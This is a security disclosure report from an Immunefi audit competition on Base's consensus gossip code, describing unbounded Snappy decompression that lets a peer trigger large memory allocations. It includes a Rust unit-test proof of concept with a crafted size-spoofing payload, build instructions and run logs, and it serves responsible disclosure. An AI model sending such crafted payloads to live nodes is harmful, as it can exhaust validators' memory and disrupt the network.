# 75979 bc medium compute message id decompresses every incoming gossip message via snap raw decoder decompress vec without enforcing the documented decompressed size cap allowing per messa&#x20;

> **Submitted on May 2nd 2026 at 02:03:48 UTC by @Another for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #75979
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours

## Description

## Brief/Intro

The `MAX_GOSSIP_SIZE` constant is documented as covering both compressed and decompressed message sizes. In practice, the code only enforces it on the compressed input via libp2p `max_transmit_size`. The Snappy decompressors in the gossip path call `decompress_vec` directly, which calls `vec![0; decompress_len(input)?]` and reads the declared length from the message header — capped only at `u32::MAX` (\~4 GiB) by the `snap` crate.

## Vulnerability Details

```rust
// base/crates/consensus/gossip/src/config.rs:14-15
/// The maximum gossip size.
/// Limits the total size of gossip RPC containers as well as decompressed individual messages.
pub const MAX_GOSSIP_SIZE: usize = 10 * (1 << 20);

// base/crates/consensus/gossip/src/config.rs:104-122
/// Computes the [`MessageId`] of a [`gossipsub`] message.
fn compute_message_id(msg: &Message) -> MessageId {
    let mut decoder = Decoder::new();
    let id = decoder.decompress_vec(&msg.data).map_or_else(
        |_| {
            warn!(target: "cfg", "Failed to decompress message, using invalid snappy");
            let domain_invalid_snappy: Vec<u8> = vec![0x0, 0x0, 0x0, 0x0];
            sha256([domain_invalid_snappy.as_slice(), msg.data.as_slice()].concat().as_slice())
                [..20]
                .to_vec()
        },
        |data| {// data may be GiB-sized
            let domain_valid_snappy: Vec<u8> = vec![0x1, 0x0, 0x0, 0x0];
            sha256([domain_valid_snappy.as_slice(), data.as_slice()].concat().as_slice())[..20]
                .to_vec()
        },
    );

    MessageId(id)
}
```

The doc claims a decompressed-size limit; the implementation does not enforce one. `compute_message_id` is invoked by libp2p for every incoming gossip message before any application-level validation runs.

Same patterns exist in multiple files:

* base/crates/consensus/gossip/src/config.rs:14-15 — doc claims decompressed-size limit
* base/crates/consensus/gossip/src/config.rs:104-122 — `compute_message_id` with unbounded `decompress_vec`
* base/crates/common/rpc-types-engine/src/envelope.rs:255-275 — `decode_v1` with same pattern
* base/crates/common/rpc-types-engine/src/envelope.rs:299-319 — `decode_v2`
* base/crates/common/rpc-types-engine/src/envelope.rs:343-365 — `decode_v3`
* base/crates/common/rpc-types-engine/src/envelope.rs:399-420 — `decode_v4`

## Impact Details

On default Linux with overcommit, each per-message `vec![0; 4 GiB]` is virtual address space (`mmap MAP_ANONYMOUS`) that does not commit physical RAM until written. Snappy then writes up to `~10 MiB × 65 ≈ 650 MiB` of physical pages before the decoder errors on input exhaustion (Snappy max copy expansion is \~65×). 650 MiB transient per message, multiplied across the seen-message cache window, sustains a 30%+ increase in RSS on a typical Base validator (16-32 GB RAM). On strict-overcommit systems (`vm.overcommit_memory=2`) or cgroup-bounded containers, allocation failure aborts the affected task. The `compute_message_id` callback runs on the libp2p gossipsub task; abort terminates the gossip subsystem.

## References

<https://github.com/base/base/blob/e3467a2048881213b56739a54a876efb9c6ea103/crates/consensus/gossip/src/config.rs#L88>

<https://github.com/base/base/blob/e3467a2048881213b56739a54a876efb9c6ea103/crates/consensus/gossip/src/config.rs#L104>

<https://github.com/base/base/blob/e3467a2048881213b56739a54a876efb9c6ea103/crates/common/rpc-types-engine/src/envelope.rs#L255-L425>

## Proof of Concept

Place this inside the existing `#[cfg(test)] mod tests { ... }` block in base/crates/consensus/gossip/src/config.rs, alongside `test_compute_message_id_invalid_snappy` / `_valid_snappy`. It must live in-tree because `compute_message_id` is private (it is referenced via `.message_id_fn(compute_message_id)` from `default_config_builder`, but never re-exported from `lib.rs`).

```rust
#[test]
fn poc_compute_message_id_ignores_documented_decompressed_size_cap() {
    fn write_varint_u32(mut n: u32, out: &mut Vec<u8>) {
        loop {
            let mut byte = (n & 0x7f) as u8;
            n >>= 7;
            if n != 0 {
                byte |= 0x80;
            }
            out.push(byte);
            if n == 0 {
                break;
            }
        }
    }

    let declared: u32 = (MAX_GOSSIP_SIZE * 10) as u32;
    let mut crafted = Vec::new();
    write_varint_u32(declared, &mut crafted);
    crafted.push(0x00);
    crafted.push(0x42);

    assert!(
        crafted.len() < MAX_GOSSIP_SIZE,
        "compressed payload {} bytes — admitted by max_transmit_size",
        crafted.len()
    );

    let header_declared = snap::raw::decompress_len(&crafted).unwrap();
    assert!(
        header_declared > MAX_GOSSIP_SIZE,
        "declared decompressed length {} > MAX_GOSSIP_SIZE {} ({}x)",
        header_declared,
        MAX_GOSSIP_SIZE,
        header_declared / MAX_GOSSIP_SIZE
    );

    let msg = Message {
        source: None,
        data: crafted,
        sequence_number: None,
        topic: libp2p::gossipsub::TopicHash::from_raw("poc"),
    };
    let id = compute_message_id(&msg);

    assert_eq!(id.0.len(), 20, "compute_message_id always returns a 20-byte id");
}
```

### Why the body is `[0x00, 0x42]`

Snappy raw format expects the varint header followed by element tags. `0x00` is a literal tag with `(length-1) = 0`, so it announces 1 literal byte (`0x42`). After consuming this, Snappy expects more elements until `declared` bytes are produced; it errors before reaching that, but only **after** the buffer has been allocated. This deliberately exercises the allocation-precedes-decode-error path.

### Why 100 MiB rather than 4 GiB

The PoC's purpose is to demonstrate the bypass, not to OOM the test runner. 100 MiB is unambiguously above the 10 MiB cap and is safe to allocate as a virtual reservation (Snappy writes one byte then errors, so physical commit stays at one page). Bumping `declared` to `u32::MAX - 1` exercises the same code path with a \~4 GiB virtual reservation; on overcommit-strict hosts (`vm.overcommit_memory=2`) or cgroup-bounded containers, it aborts the gossipsub task instead.

## Required workspace config workaround

The repo's base/.cargo/config.toml pins a non-default linker on macOS:

```toml
[target.aarch64-apple-darwin]
rustflags = ["-C", "link-arg=-fuse-ld=/opt/homebrew/opt/lld/bin/ld64.lld"]
```

If `lld` is not installed (`brew install lld`), `cargo` will fail at the link step before any test can run, with:

```
clang: error: invalid linker name in argument '-fuse-ld=/opt/homebrew/opt/lld/bin/ld64.lld'
```

Cargo merges target rustflags rather than replacing them, so neither `RUSTFLAGS=`, `CARGO_TARGET_AARCH64_APPLE_DARWIN_RUSTFLAGS=`, nor `cargo --config 'target.aarch64-apple-darwin.rustflags=[]'` will neutralize the workspace setting. The two working options are:

{% stepper %}
{% step %}
Install lld — `brew install lld` (one-time setup the workspace expects).
{% endstep %}

{% step %}
Temporarily comment the line in `base/.cargo/config.toml` for the duration of the run, then restore it:

```toml
# [target.aarch64-apple-darwin]
# rustflags = ["-C", "link-arg=-fuse-ld=/opt/homebrew/opt/lld/bin/ld64.lld"]
```

{% endstep %}
{% endstepper %}

CI Linux runners use `mold`, which is unaffected.

## Build & run

From the `base/` workspace root:

```sh
cargo test --release \
  -p base-consensus-gossip \
  --lib config::tests::poc_compute_message_id_ignores_documented_decompressed_size_cap \
  -- --nocapture
```

Cold compile takes \~9 minutes (libp2p, openssl-vendored, alloy, etc.). Subsequent runs reuse `target/`.

## Recorded run logs

Tail of the cargo build & test output from the actual run on `aarch64-apple-darwin`:

```
   Compiling base-consensus-gossip v0.8.0 (/Users/mine/Desktop/Base/base/crates/consensus/gossip)
    Finished `release` profile [optimized] target(s) in 9m 09s
     Running unittests src/lib.rs (target/release/deps/base_consensus_gossip-9bc4d4db271cbc2e)

running 1 test
test config::tests::poc_compute_message_id_ignores_documented_decompressed_size_cap ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 44 filtered out; finished in 0.01s
```

Test execution time of `0.01s` confirms the 100 MiB `vec![0; n]` is satisfied by virtual address-space reservation alone — no measurable physical commit before Snappy errors and the buffer is dropped.
